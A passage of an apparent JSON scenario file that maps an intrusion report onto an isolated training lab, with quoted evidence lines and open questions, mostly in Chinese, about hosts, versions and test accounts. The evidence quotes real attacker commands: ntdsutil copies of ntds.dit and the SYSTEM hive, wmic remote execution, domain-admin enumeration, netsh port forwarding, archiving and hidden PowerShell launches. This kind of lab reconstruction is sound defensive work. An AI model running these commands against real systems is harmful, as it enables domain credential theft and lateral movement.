+   "quote": "cmd /c \"cmd.exe /c \"netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999\"\" C:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Desktop\\Win.exe",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "93"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd /c \"cmd.exe /c \"netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999\"\" C:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Deskto"
+  },
+  {
+   "id": "evidence-74",
+   "quote": "cmd.exe /C dir /S \\\\{REDACTED}\\c$\\Users\\{REDACTED} >> c:\\windows\\temp\\{REDACTED}.tmp \"cmd.exe\" /c wmic process call create \"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /C dir /S \\\\{REDACTED}\\c$\\Users\\{REDACTED} >> c:\\windows\\temp\\{REDACTED}.tmp \"cmd.exe\" /c wmic process call create \""
+  },
+  {
+   "id": "evidence-75",
+   "quote": "cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1"
+  },
+  {
+   "id": "evidence-76",
+   "quote": "cmd.exe /Q /c net group \"domain admins\" /dom 1>\\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /Q /c net group \"domain admins\" /dom 1>\\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1"
+  },
+  {
+   "id": "evidence-77",
+   "quote": "cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" 1> \\\\127.0.0.1\\ADMIN$\\<timestamp value> 2>&1 D:\\{REDACTED}\\xcopy C:\\windows\\temp\\hp d:\\{REDACTED} Get-EventLog security -instanceid 4624 ldifde.exe -f c:\\windows\\temp\\cisco_up.txt -p subtree makecab ..\\backup\\210829-020000.zip ..\\webapps\\adssp\\html\\Lock.lic move \"\\\\<redacted>\\c$\\users\\public\\Appfile\\registry\\SYSTEM\" ..\\backup\\210829-020000.zip netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcp netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999 Rar.exe a –{REDACTED} c:\\Windows\\temp\\DMBC2C61.tmp start-process -filepath c:\\windows\\temp\\<filename>.bat - windowstyle hidden 1 Note: The batch file in question (<filename>.bat) could use any name, and no discernable pattern has been determined at this time. wmic process call create \"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" 1> \\\\127.0.0.1\\ADM"
+  },
+  {
+   "id": "evidence-78",
+   "quote": "cmd.exe /c mkdir C:\\users\\public\\Appfile & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\users\\public\\Appfile\\\" q q",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c mkdir C:\\users\\public\\Appfile & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\users\\public\\Appfile\\\" q q"
+  },
+  {
+   "id": "evidence-79",
+   "quote": "cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" wmic process call create \"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "97"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" wmic process call create \""
+  },
+  {
+   "id": "evidence-80",
+   "quote": "cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\" wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "97"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\" wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\\""
+  },
+  {
+   "id": "evidence-81",
+   "quote": "cmd.exe /C dir /S \\\\* >> * ",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "98"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /C dir /S \\\\* >> * "
+  },
+  {
+   "id": "evidence-82",
+   "quote": "cmd.exe /Q /c * 1> \\\\127.0.0.1\\ADMIN$\\__*.*>&1 ",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "98"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /Q /c * 1> \\\\127.0.0.1\\ADMIN$\\__*.*>&1 "
+  },
+  {
+   "id": "evidence-83",
+   "quote": "powershell start-process -filepath c:\\windows\\temp\\*.exe - windowstyle hidden",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "98"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell start process filepath c:\\windows\\temp\\*.exe windowstyle hidden"
+  }
+ ],
+ "missing_items": [
+  {
+   "id": "missing-hosts-h1-os-version",
+   "field": "Windows domain controllers — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Windows domain controllers 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h1 — Windows domain controllers",
+    "action:a2 — Created a Volume Shadow Copy and extracted a copy of the ntds.dit file",
+    "action:a3 — Executed WMIC commands to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe",
+    "action:a7 — Executed commands to enumerate network topology, Active Directory structure, and environment information"
+   ],
+   "suggestions": [
+    "Windows Server 2019（確切 build 待確認）",
+    "Windows Server 2016（確切 build 待確認）",
+    "Windows Server 2022（確切 build 待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Windows domain controllers",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-16",
+      "evidence-17",
+      "evidence-18",
+      "evidence-2",
+      "evidence-3",
+      "evidence-4",
+      "evidence-9"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os",
+   "field": "Compromised SOHO network devices — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Compromised SOHO network devices 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h2 — Compromised SOHO network devices"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Compromised SOHO network devices",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-19",
+      "evidence-20"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os-version",
+   "field": "Compromised SOHO network devices — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Compromised SOHO network devices 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h2 — Compromised SOHO network devices"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Compromised SOHO network devices",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-19",
+      "evidence-20"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-os",
+   "field": "Internal hosts with Windows OS — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Internal hosts with Windows OS 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h3 — Internal hosts with Windows OS",
+    "action:a1 — Executed WMIC command to gather information about local drives",
+    "action:a4 — Used netsh interface portproxy add commands to enable port forwarding on the host",
+    "action:a5 — Used PowerShell command to identify successful logons to the host",
+    "action:a6 — Used Impacket's wmiexec to execute commands redirecting output to a file in ADMIN$ share",
+    "action:a7 — Executed commands to enumerate network topology, Active Directory structure, and environment information",
+    "action:a8 — Executed commands to identify additional credential theft opportunities",
+    "action:a9 — Executed additional commands including archiving, process execution, network commands, and file copying"
+   ],
+   "suggestions": [
+    "Windows Server 2019（候選；請核對原文或資產清單）",
+    "Windows Server 2016（候選；請核對原文或資產清單）",
+    "Windows Server 2022（候選；請核對原文或資產清單）",
+    "其他 Windows 版本（請填確切版本）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Internal hosts with Windows OS",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-21",
+      "evidence-22",
+      "evidence-23",
+      "evidence-24",
+      "evidence-25",
+      "evidence-1",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11"
+     ]
+    },
+    {
+     "field": "作業系統",
+     "value": "Windows",
+     "source_ref": "hosts:h3.os",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-21",
+      "evidence-22",
+      "evidence-23",
+      "evidence-24",
+      "evidence-25",
+      "evidence-1",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server 2019（候選；請核對原文或資產清單）",
+    "Windows Server 2016（候選；請核對原文或資產清單）",
+    "Windows Server 2022（候選；請核對原文或資產清單）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-os-version",
+   "field": "Internal hosts with Windows OS — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Internal hosts with Windows OS 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h3 — Internal hosts with Windows OS",
+    "action:a1 — Executed WMIC command to gather information about local drives",
+    "action:a4 — Used netsh interface portproxy add commands to enable port forwarding on the host",
+    "action:a5 — Used PowerShell command to identify successful logons to the host",
+    "action:a6 — Used Impacket's wmiexec to execute commands redirecting output to a file in ADMIN$ share",
+    "action:a7 — Executed commands to enumerate network topology, Active Directory structure, and environment information",
+    "action:a8 — Executed commands to identify additional credential theft opportunities",
+    "action:a9 — Executed additional commands including archiving, process execution, network commands, and file copying"
+   ],
+   "suggestions": [
+    "Windows Server 2019（確切 build 待確認）",
+    "Windows Server 2016（確切 build 待確認）",
+    "Windows Server 2022（確切 build 待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Internal hosts with Windows OS",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-21",
+      "evidence-22",
+      "evidence-23",
+      "evidence-24",
+      "evidence-25",
+      "evidence-1",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-network",
+   "field": "Internal hosts with Windows OS — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Internal hosts with Windows OS 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h3 — Internal hosts with Windows OS",
+    "action:a1 — Executed WMIC command to gather information about local drives",
+    "action:a4 — Used netsh interface portproxy add commands to enable port forwarding on the host",
+    "action:a5 — Used PowerShell command to identify successful logons to the host",
+    "action:a6 — Used Impacket's wmiexec to execute commands redirecting output to a file in ADMIN$ share",
+    "action:a7 — Executed commands to enumerate network topology, Active Directory structure, and environment information",
+    "action:a8 — Executed commands to identify additional credential theft opportunities",
+    "action:a9 — Executed additional commands including archiving, process execution, network commands, and file copying"
+   ],
+   "suggestions": [
+    "內部／管理網段（候選；請確認允許來源）",
+    "隔離測試網段（只連必要主機）",
+    "其他網段（請描述區域與可達路徑）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Internal hosts with Windows OS",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-21",
+      "evidence-22",
+      "evidence-23",
+      "evidence-24",
+      "evidence-25",
+      "evidence-1",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11"
+     ]
+    },
+    {
+     "field": "網段/網路位置",
+     "value": "internal network hosts",
+     "source_ref": "hosts:h3.network_placement",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-21",
+      "evidence-22",
+      "evidence-23",
+      "evidence-24",
+      "evidence-25",
+      "evidence-1",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-product-mimikatz-version",
+   "field": "Mimikatz version",
+   "category": "software",
+   "reason": "IR 指出 Mimikatz 相關步驟，但沒有可重現所需的確切版本。",
+   "severity": "major",
+   "status": "open",
+   "question": "a8 提到 Mimikatz，但沒有提供可重現的版號。若靶場需要固定版本，請從來源或資產清單核對；否則選擇隔離靶場替代並標記。",
+   "affects": [
+    "action:a8 — Executed commands to identify additional credential theft opportunities"
+   ],
+   "suggestions": [
+    "請依來源或靶場設定補上具體值",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "Executed commands to identify additional credential theft opportunities",
+     "source_ref": "actions:a8.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-10"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-ad-domain-name",
+   "field": "Active Directory 網域名稱",
+   "category": "dependency",
+   "reason": "IR 提到 AD/domain controller，但沒有網域名稱或隔離靶場對應方式。",
+   "severity": "major",
+   "status": "open",
+   "question": "a7 涉及 Active Directory（h1 (Windows domain controllers)），但 IR 沒有網域名稱。靶場要使用哪個網域名稱？可提供 lab 專用名稱（例如 lab.test），不要提供密碼或真實帳密。",
+   "affects": [
+    "host:h1 — Windows domain controllers",
+    "action:a7 — Executed commands to enumerate network topology, Active Directory structure, and environment information"
+   ],
+   "suggestions": [
+    "隔離靶場專用網域（例如 lab.test）",
+    "從原文/資產清單填實際網域",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "主機角色",
+     "value": "Windows domain controllers",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-16",
+      "evidence-17",
+      "evidence-18"
+     ]
+    },
+    {
+     "field": "AD 相關步驟",
+     "value": "Executed commands to enumerate network topology, Active Directory structure, and environment information",
+     "source_ref": "actions:a7.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-9"
+     ]
+    },
+    {
+     "field": "目錄服務線索",
+     "value": "Active Directory / domain controller",
+     "source_ref": "ir:actions+hosts",
+     "epistemic_status": "supported"
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-action-a1-start-condition",
+   "field": "Executed WMIC command to gather information about local drives — 執行前置條件",
+   "category": "precondition",
+   "reason": "IR 沒有說明這個情境的起始存取狀態；不假設攻擊者已經有立足點。",
+   "severity": "major",
+   "status": "open",
+   "question": "情境從「Executed WMIC command to gather information about local drives」開始。執行這一步前需要哪個已知帳號、服務或其他狀態？若來源沒有說明，請選擇直接從此步驟開始或保留未知。",
+   "affects": [
+    "action:a1 — Executed WMIC command to gather information about local drives"
+   ],
+   "suggestions": [
+    "直接從這一步開始重現（前置條件不重建）",
+    "補上來源明確記載的前置條件",
+    "保留未知"
+   ],
+   "known": [
+    {
+     "field": "IR 起始步驟",
+     "value": "Executed WMIC command to gather information about local drives",
+     "source_ref": "actions:a1.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-1"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-gap-credential-material",
+   "field": "憑證的存放位置與靶場測試帳號",
+   "category": "account",
+   "reason": "步驟取得或使用了憑證，但 IR 沒有憑證存放的位置／格式，也沒有可安全使用的靶場帳號。",
+   "severity": "major",
+   "status": "open",
+   "question": "這些憑證原本存放在哪裡（檔案、資料庫、記憶體）、是什麼格式？靶場要用哪組專用測試帳號代表？請勿提供任何真實密碼。",
+   "affects": [
+    "action:a8 — Executed commands to identify additional credential theft opportunities",
+    "action:a9 — Executed additional commands including archiving, process execution, network commands, and file copying",
+    "host:h3 — Internal hosts with Windows OS"
+   ],
+   "suggestions": [
+    "使用專用測試帳號（不提供真實密碼）",
+    "填入來源記載的存放位置並指定安全替身",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "Executed commands to identify additional credential theft opportunities",
+     "source_ref": "actions:a8.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-10"
+     ]
+    },
+    {
+     "field": "相關步驟",
+     "value": "Executed additional commands including archiving, process execution, network commands, and file copying",
+     "source_ref": "actions:a9.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-11"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "planner_dep_software-active-directory-database-n",
+   "field": "software dependency: Active Directory database (ntds.dit)",
+   "category": "software",
+   "reason": "The dependency was identified in the actions or target context, but no compatible open-source catalogue component is available.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s1",
+   "question": "Active Directory database (ntds.dit) 在元件目錄中沒有可部署的對應。要用哪個目錄元件當教學替代？請回答一個元件名稱（例如下列建議），或選擇不部署並保留為未知。",
+   "suggestions": [
+    "PostgreSQL（替代品，不等於原軟體）",
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_software-windows-management-instrume",
+   "field": "software dependency: Windows Management Instrumentation Command Line (WMIC)",
+   "category": "software",
+   "reason": "The dependency was identified in the actions or target context, but no compatible open-source catalogue component is available.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s2",
+   "question": "Windows Management Instrumentation Command Line (WMIC) 在元件目錄中沒有可部署的對應。要用哪個目錄元件當教學替代？請回答一個元件名稱（例如下列建議），或選擇不部署並保留為未知。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_software-powershell",
+   "field": "software dependency: PowerShell",
+   "category": "software",
+   "reason": "The dependency was identified in the actions or target context, but no compatible open-source catalogue component is available.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s3",
+   "question": "PowerShell 在元件目錄中沒有可部署的對應。要用哪個目錄元件當教學替代？請回答一個元件名稱（例如下列建議），或選擇不部署並保留為未知。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_software-portproxy-netsh-interface-p",
+   "field": "software dependency: PortProxy (netsh interface portproxy)",
+   "category": "software",
+   "reason": "The dependency was identified in the actions or target context, but no compatible open-source catalogue component is available.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s4",
+   "question": "PortProxy (netsh interface portproxy) 在元件目錄中沒有可部署的對應。要用哪個目錄元件當教學替代？請回答一個元件名稱（例如下列建議），或選擇不部署並保留為未知。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_software-impacket-wmiexec",
+   "field": "software dependency: Impacket wmiexec",
+   "category": "software",
+   "reason": "The dependency was identified in the actions or target context, but no compatible open-source catalogue component is available.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s5",
+   "question": "Impacket wmiexec 在元件目錄中沒有可部署的對應。要用哪個目錄元件當教學替代？請回答一個元件名稱（例如下列建議），或選擇不部署並保留為未知。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_version-active-directory-h3",
+   "field": "version for Active Directory",
+   "category": "version",
+   "reason": "A software dependency was identified, but its version was not stated in the actions or target context.",
+   "severity": "major",
+   "status": "open"
+  },
+  {
+   "id": "planner_dep_software-openssh",
+   "field": "software dependency: OpenSSH",
+   "category": "software",
+   "reason": "The dependency was identified in the actions or target context, but no compatible open-source catalogue component is available.",
+   "severity": "major",
+   "status": "open"
+  }
+ ],
+ "quality": {
+  "quote_verified_rate": 0.8554,
+  "unsupported_claim_count": 17,
+  "inferred_count": 5,
+  "absent_count": 0,
+  "method": "single_pass",
+  "provisional": true,
+  "dropped_placeholder_hosts": 0,
+  "excluded_non_attacker_actions": [],
+  "hedged_action_count": 0,
+  "capability_action_count": 0,
+  "dropped_non_software_services": [],
+  "dropped_misplaced_techniques": []
+ },
+ "id": "scn_evidence",
+ "fidelity": "needs_vm"
+}
